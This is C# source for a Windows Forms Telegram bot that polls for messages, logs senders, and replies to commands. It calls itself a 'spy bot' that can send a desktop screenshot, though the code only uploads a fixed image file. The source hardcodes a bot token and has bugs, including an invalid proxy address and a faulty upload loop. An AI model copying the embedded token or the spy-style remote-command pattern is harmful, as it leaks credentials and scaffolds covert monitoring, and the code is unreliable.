using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using Newtonsoft.Json;
using System.Collections.Specialized;
using System.IO;

namespace TelegramBot
{
    public partial class MainForm : Form
    {
        private string token = "1416810810:AAGM84vwYkU0_6UlsdBYfea4246S00Cm_fA";
        private string baseUrl = "https://api.telegram.org/bot";
        WebClient client;
        private long LastUpdateID=0;
        private string fileLog = "BotLog.log";
        public MainForm()
        {
            InitializeComponent();
            Init();
        }
        private void Init()
        {
            client = new WebClient();
            //InitProxy();
            WriteLog("Authorization");
            timergetUpdates.Enabled = true;
        }
        private void InitProxy()
        {
            WebProxy proxy = new WebProxy("192.168.0.0.1", 8080);
            proxy.Credentials = new NetworkCredential("UserName", "password");
            client.Proxy = proxy;
        }
        private void SendMessage(long chatId,string message)
        {
            string address = baseUrl + token + "/sendMessage";
            NameValueCollection collection = new NameValueCollection();
            collection.Add("chat_id", chatId.ToString());
            collection.Add("text", message);
            client.UploadValues(address, collection);
        }

        private void timergetUpdates_Tick(object sender, EventArgs e)
        {
            GetUpdates();
        }
        private void GetUpdates()
        {
            String dwLine=client.DownloadString(baseUrl + token + "/getUpdates?offset=" + (LastUpdateID+1));
            TelegramMessage nMessages = JsonConvert.DeserializeObject<TelegramMessage>(dwLine);
            if(!nMessages.ok||nMessages.result.Length==0)
            {
                return;
            }
            foreach(MessageResult result in nMessages.result)
            {
                LastUpdateID = result.update_id;
                WriteLog(result.message.from.first_name + "(" + result.message.from.id + "): " + result.message.text);
                SendAnswer(result.message.chat.id,result.message.text);

            }
        }
        private void SendAnswer(long chatID,string message)
        {
            string answer="";
            switch (message.ToLower())
            {
                case "/help": answer = @"Welcome to the bot helper. 
All supported commands are listed below:
/start      - getting started with a bot
/help       - list of available commands
/getlog     - send you log file data
/screenshot - send screenshot of your desktop";

                        break;
                case "/getlog": answer = RetLog();
                    break;
                case "/start": answer = "I'm your spy bot, you know what i can do? /help";
                    break;
                case "/screenshot": SendPrintScreen(chatID); return;
                default: answer = "You write to me: '"+message+"', but i dont know what to answer";
                    break;
            }
            SendMessage( chatID,answer);
        }
        private void WriteLog(string text)
        {
            text = DateTime.Now + " " + text+";" + Environment.NewLine ;
            textBoxLog.Text += text;
            File.AppendAllText(fileLog,text);
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            WriteLog("Bot stopped.");
        }
        private string RetLog()
        {
            string answer = "";
            if (File.Exists(fileLog))
            {
                string[] readingFileLog = File.ReadAllLines(fileLog);
                int fileLogLenght = (readingFileLog.Length - 10) < 0 ? 0 : (readingFileLog.Length - 11);
                for(int i =fileLogLenght;i<readingFileLog.Length;i++)
                {
                    answer += readingFileLog[i] + Environment.NewLine;
                }
            }
            return answer;
        }
        private void HttpUploadFile(string url,string file, string paramName, string contentType, NameValueCollection nvc)
        {
            //generating a POST request
            string boundary = "-------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundaryBytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(url);
            webRequest.ContentType = "multipart/form-data; boundary=" + boundary;
            webRequest.Method = "POST";
            webRequest.KeepAlive = true;
            webRequest.Credentials = CredentialCache.DefaultCredentials;
            Stream rs = webRequest.GetRequestStream();
            string formdataTemplate="Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";

            foreach (string key in nvc.Keys)
            {
                rs.Write(boundaryBytes, 0, boundaryBytes.Length);
                string formitem = string.Format(formdataTemplate, key, nvc[key]);
                byte[] formitembytes = Encoding.UTF8.GetBytes(formitem);
                rs.Write(formitembytes, 0, formitembytes.Length);
            }

            rs.Write(boundaryBytes, 0, boundaryBytes.Length);
            string headerTemplate="Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
            string header = string.Format(headerTemplate, paramName, file, contentType);
            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
            rs.Write(headerBytes, 0, headerBytes.Length);
            //image file processing
            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[4096];
            int bytesRead = 0;
            //writing the image in to the stream
            while ((bytesRead=fileStream.Read(buffer,0,buffer.Length))!=0)
            {
                rs.Write(buffer, 0, buffer.Length);
            }
            fileStream.Close();

            byte[] trailer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
            rs.Write(trailer, 0, trailer.Length);
            rs.Close();

            WebResponse wResp = null;
            try
            {
                wResp = webRequest.GetResponse();
                Stream stream = wResp.GetResponseStream();
                StreamReader reader = new StreamReader(stream);
                WriteLog("File" + file + " is uploaded, server request: " + reader.ReadToEnd());
            }
            catch (Exception ex)
            {
                WriteLog("File upload error: " + ex.Message);
                if (wResp!=null)
                {
                    wResp.Close();
                    wResp = null;
                }
                throw;
            }
            finally
            { 
                webRequest = null; 
            }
                
        }
        private void SendPrintScreen(long chatID)
        {
            string address = baseUrl + token + "/sendPhoto";
            NameValueCollection nvc = new NameValueCollection();
            nvc.Add("chat_id", chatID.ToString());
            HttpUploadFile(address, "NuGet.png", "photo", "image/png", nvc);
        }
    }
}
